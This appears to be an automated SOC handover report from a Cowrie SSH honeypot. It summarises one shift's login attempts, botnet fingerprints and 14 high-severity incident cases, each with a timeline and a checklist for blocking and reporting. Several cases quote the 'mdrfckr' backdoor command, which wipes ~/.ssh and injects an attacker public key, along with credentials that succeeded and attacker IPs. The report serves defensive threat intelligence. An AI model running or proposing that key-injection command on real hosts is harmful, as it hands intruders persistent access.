# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-07 |
| **Generated At** | 2026-05-07T10:28:54Z |
| **Shift Time** | 10:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **309** |
| Confirmed Threats | **268** |
| False Positives Filtered | **41** (13.3%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **18** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **295** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **92** |
| Unique Credential Pairs | **74** |
| Unique Usernames | **40** |
| Unique Passwords | **67** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `ubuntu` | 13 |
| `345gs5662d34` | 7 |
| `admin` | 6 |
| `GET / HTTP/1.1` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept-Encoding: gzip` | 3 |
| `$4` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin!!!1` | `47.242.14.19` | 2026-05-07T06:42:39 |
| `root` | `3245gs5662d34` | `47.242.14.19` | 2026-05-07T06:42:43 |
| `root` | `admin.pass` | `81.177.101.45` | 2026-05-07T08:36:48 |
| `root` | `3245gs5662d34` | `81.177.101.45` | 2026-05-07T08:36:53 |
| `root` | `adpadmin` | `81.177.101.45` | 2026-05-07T08:40:42 |
| `root` | `adminn` | `81.177.101.45` | 2026-05-07T08:48:46 |
| `root` | `admin1234!` | `81.177.101.45` | 2026-05-07T08:51:06 |
| `root` | `mcserver` | `34.0.13.61` | 2026-05-07T08:55:08 |
| `root` | `3245gs5662d34` | `34.0.13.61` | 2026-05-07T08:55:11 |
| `root` | `localadmin` | `34.0.13.61` | 2026-05-07T09:21:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **309** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 83 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 80 | 3 |
| `e37f354a101a...` | Mirai/variant | 2 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 80 | 3 | libssh-based |
| `e37f354a101a...` | libssh | 2 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.0.13.61`, `81.177.101.45`, `47.242.14.19`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **28** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | LOW |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 1 | LOW |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS24863` | Link Egypt (Link.NET) | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-29a2a5dc16f9

| Field | Detail |
|---|---|
| **Source IP** | `47.242.14[.]19` |
| **First Seen** | 2026-05-07 06:42 |
| **Last Seen** | 2026-05-07 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 06:42:39` | `cowrie.session.connect` |
| `2026-05-07 06:42:39` | `cowrie.client.version` |
| `2026-05-07 06:42:39` | `cowrie.client.kex` |
| `2026-05-07 06:42:39` | `cowrie.login.success` |
| `2026-05-07 06:42:40` | `cowrie.session.params` |
| `2026-05-07 06:42:40` | `cowrie.command.input` |
| `2026-05-07 06:42:40` | `cowrie.command.failed` |
| `2026-05-07 06:42:40` | `cowrie.log.closed` |
| `2026-05-07 06:42:40` | `cowrie.session.params` |
| `2026-05-07 06:42:40` | `cowrie.command.input` |
| `2026-05-07 06:42:40` | `cowrie.session.file_download` |
| `2026-05-07 06:42:40` | `cowrie.log.closed` |
| `2026-05-07 06:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.14[.]19` to AbuseIPDB if not already reported
- [ ] Block `47.242.14[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0f339c1c77

| Field | Detail |
|---|---|
| **Source IP** | `47.242.14[.]19` |
| **First Seen** | 2026-05-07 06:42 |
| **Last Seen** | 2026-05-07 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 06:42:42` | `cowrie.session.connect` |
| `2026-05-07 06:42:42` | `cowrie.client.version` |
| `2026-05-07 06:42:42` | `cowrie.client.kex` |
| `2026-05-07 06:42:43` | `cowrie.login.success` |
| `2026-05-07 06:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.14[.]19` to AbuseIPDB if not already reported
- [ ] Block `47.242.14[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06f283b00a35

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:36 |
| **Last Seen** | 2026-05-07 08:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:36:47` | `cowrie.session.connect` |
| `2026-05-07 08:36:47` | `cowrie.client.version` |
| `2026-05-07 08:36:48` | `cowrie.client.kex` |
| `2026-05-07 08:36:48` | `cowrie.login.success` |
| `2026-05-07 08:36:49` | `cowrie.session.params` |
| `2026-05-07 08:36:49` | `cowrie.command.input` |
| `2026-05-07 08:36:49` | `cowrie.command.failed` |
| `2026-05-07 08:36:49` | `cowrie.log.closed` |
| `2026-05-07 08:36:49` | `cowrie.session.params` |
| `2026-05-07 08:36:49` | `cowrie.command.input` |
| `2026-05-07 08:36:49` | `cowrie.session.file_download` |
| `2026-05-07 08:36:49` | `cowrie.log.closed` |
| `2026-05-07 08:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8a857e4d091

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:36 |
| **Last Seen** | 2026-05-07 08:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:36:52` | `cowrie.session.connect` |
| `2026-05-07 08:36:52` | `cowrie.client.version` |
| `2026-05-07 08:36:52` | `cowrie.client.kex` |
| `2026-05-07 08:36:53` | `cowrie.login.success` |
| `2026-05-07 08:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2edd86ad9d1c

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:40 |
| **Last Seen** | 2026-05-07 08:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:40:41` | `cowrie.session.connect` |
| `2026-05-07 08:40:41` | `cowrie.client.version` |
| `2026-05-07 08:40:41` | `cowrie.client.kex` |
| `2026-05-07 08:40:42` | `cowrie.login.success` |
| `2026-05-07 08:40:42` | `cowrie.session.params` |
| `2026-05-07 08:40:43` | `cowrie.command.input` |
| `2026-05-07 08:40:43` | `cowrie.command.failed` |
| `2026-05-07 08:40:43` | `cowrie.log.closed` |
| `2026-05-07 08:40:43` | `cowrie.session.params` |
| `2026-05-07 08:40:43` | `cowrie.command.input` |
| `2026-05-07 08:40:43` | `cowrie.session.file_download` |
| `2026-05-07 08:40:43` | `cowrie.log.closed` |
| `2026-05-07 08:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a6ff95289f

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:40 |
| **Last Seen** | 2026-05-07 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:40:46` | `cowrie.session.connect` |
| `2026-05-07 08:40:46` | `cowrie.client.version` |
| `2026-05-07 08:40:46` | `cowrie.client.kex` |
| `2026-05-07 08:40:46` | `cowrie.login.success` |
| `2026-05-07 08:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8752e07bb85

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:48 |
| **Last Seen** | 2026-05-07 08:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:48:45` | `cowrie.session.connect` |
| `2026-05-07 08:48:45` | `cowrie.client.version` |
| `2026-05-07 08:48:45` | `cowrie.client.kex` |
| `2026-05-07 08:48:46` | `cowrie.login.success` |
| `2026-05-07 08:48:46` | `cowrie.session.params` |
| `2026-05-07 08:48:46` | `cowrie.command.input` |
| `2026-05-07 08:48:46` | `cowrie.command.failed` |
| `2026-05-07 08:48:46` | `cowrie.log.closed` |
| `2026-05-07 08:48:47` | `cowrie.session.params` |
| `2026-05-07 08:48:47` | `cowrie.command.input` |
| `2026-05-07 08:48:47` | `cowrie.session.file_download` |
| `2026-05-07 08:48:47` | `cowrie.log.closed` |
| `2026-05-07 08:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-172695cac2d7

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:48 |
| **Last Seen** | 2026-05-07 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:48:49` | `cowrie.session.connect` |
| `2026-05-07 08:48:49` | `cowrie.client.version` |
| `2026-05-07 08:48:50` | `cowrie.client.kex` |
| `2026-05-07 08:48:50` | `cowrie.login.success` |
| `2026-05-07 08:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff41019272ef

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:51 |
| **Last Seen** | 2026-05-07 08:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:51:05` | `cowrie.session.connect` |
| `2026-05-07 08:51:05` | `cowrie.client.version` |
| `2026-05-07 08:51:05` | `cowrie.client.kex` |
| `2026-05-07 08:51:06` | `cowrie.login.success` |
| `2026-05-07 08:51:06` | `cowrie.session.params` |
| `2026-05-07 08:51:06` | `cowrie.command.input` |
| `2026-05-07 08:51:06` | `cowrie.command.failed` |
| `2026-05-07 08:51:07` | `cowrie.log.closed` |
| `2026-05-07 08:51:07` | `cowrie.session.params` |
| `2026-05-07 08:51:07` | `cowrie.command.input` |
| `2026-05-07 08:51:07` | `cowrie.session.file_download` |
| `2026-05-07 08:51:07` | `cowrie.log.closed` |
| `2026-05-07 08:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aaed74f2032

| Field | Detail |
|---|---|
| **Source IP** | `81.177.101[.]45` |
| **First Seen** | 2026-05-07 08:51 |
| **Last Seen** | 2026-05-07 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:51:09` | `cowrie.session.connect` |
| `2026-05-07 08:51:09` | `cowrie.client.version` |
| `2026-05-07 08:51:10` | `cowrie.client.kex` |
| `2026-05-07 08:51:10` | `cowrie.login.success` |
| `2026-05-07 08:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.177.101[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.177.101[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9c2351e1a7

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-07 08:55 |
| **Last Seen** | 2026-05-07 08:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:55:08` | `cowrie.session.connect` |
| `2026-05-07 08:55:08` | `cowrie.client.version` |
| `2026-05-07 08:55:08` | `cowrie.client.kex` |
| `2026-05-07 08:55:08` | `cowrie.login.success` |
| `2026-05-07 08:55:09` | `cowrie.session.params` |
| `2026-05-07 08:55:09` | `cowrie.command.input` |
| `2026-05-07 08:55:09` | `cowrie.command.failed` |
| `2026-05-07 08:55:09` | `cowrie.log.closed` |
| `2026-05-07 08:55:09` | `cowrie.session.params` |
| `2026-05-07 08:55:09` | `cowrie.command.input` |
| `2026-05-07 08:55:09` | `cowrie.session.file_download` |
| `2026-05-07 08:55:09` | `cowrie.log.closed` |
| `2026-05-07 08:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d6272ea179d

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-07 08:55 |
| **Last Seen** | 2026-05-07 08:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 08:55:10` | `cowrie.session.connect` |
| `2026-05-07 08:55:10` | `cowrie.client.version` |
| `2026-05-07 08:55:10` | `cowrie.client.kex` |
| `2026-05-07 08:55:11` | `cowrie.login.success` |
| `2026-05-07 08:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-043f14bde33d

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-07 09:21 |
| **Last Seen** | 2026-05-07 09:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 09:21:34` | `cowrie.session.connect` |
| `2026-05-07 09:21:34` | `cowrie.client.version` |
| `2026-05-07 09:21:34` | `cowrie.client.kex` |
| `2026-05-07 09:21:34` | `cowrie.login.success` |
| `2026-05-07 09:21:34` | `cowrie.session.params` |
| `2026-05-07 09:21:34` | `cowrie.command.input` |
| `2026-05-07 09:21:34` | `cowrie.command.failed` |
| `2026-05-07 09:21:34` | `cowrie.log.closed` |
| `2026-05-07 09:21:35` | `cowrie.session.params` |
| `2026-05-07 09:21:35` | `cowrie.command.input` |
| `2026-05-07 09:21:35` | `cowrie.session.file_download` |
| `2026-05-07 09:21:35` | `cowrie.log.closed` |
| `2026-05-07 09:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
